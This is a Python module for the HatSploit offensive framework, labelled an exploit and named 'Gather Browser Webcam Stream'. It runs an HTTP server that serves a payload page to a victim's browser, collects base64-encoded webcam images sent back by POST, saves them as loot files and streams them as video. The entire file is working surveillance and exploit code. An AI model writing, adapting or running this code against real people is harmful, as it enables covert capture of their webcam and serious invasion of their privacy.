"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.handle import Handle
from hatsploit.lib.loot import Loot
from hatsploit.lib.module import Module
from pex.proto.stream import StreamClient
from pex.string import String


class HatSploitModule(Module, Handle, StreamClient, String):
    def __init__(self):
        super().__init__()

        self.loot = Loot()

        self.details = {
            'Category': "exploit",
            'Name': "Gather Browser Webcam Stream",
            'Module': "exploit/generic/gather/browser_webcam_stream",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
            ],
            'Description': "Module streams webcam through browser.",
            'Platform': "generic",
            'Rank': "medium",
        }

        self.options = {
            'SRVHOST': {
                'Description': "Host to start http server on.",
                'Value': "0.0.0.0",
                'Type': "ip",
                'Required': True,
            },
            'SRVPORT': {
                'Description': "Port to start http server on.",
                'Value': 8080,
                'Type': "port",
                'Required': True,
            },
            'PATH': {
                'Description': "Path to save file.",
                'Value': self.loot.random_loot('png'),
                'Type': None,
                'Required': True,
            },
            'URLPATH': {
                'Description': "File path on server.",
                'Value': "/",
                'Type': None,
                'Required': True,
            },
        }

    def run(self):
        server_host, server_port, path, url_path = self.parse_options(self.options)

        def get(request):
            if request.path == url_path:
                payload = self.loot.get_data('webcam/index.html')
                self.print_process("Delivering payload...")

                request.send_status(200)
                request.wfile.write(payload)

        def post(request):
            request.send_status(200)

            try:
                photo_length = int(request.headers['Content-Length'])

                post_data = request.rfile.read(photo_length)
                post_data = post_data.split(b',', 1)[1]

                photo_data = self.base64_decode(post_data, False)
            except Exception:
                return

            self.loot.save_file(path, photo_data, 'png')

        client = self.open_stream(self.loot.random_loot('html'), path)

        client.create_video()
        client.stream()

        self.listen_server(server_host, server_port, {'GET': get, 'POST': post})
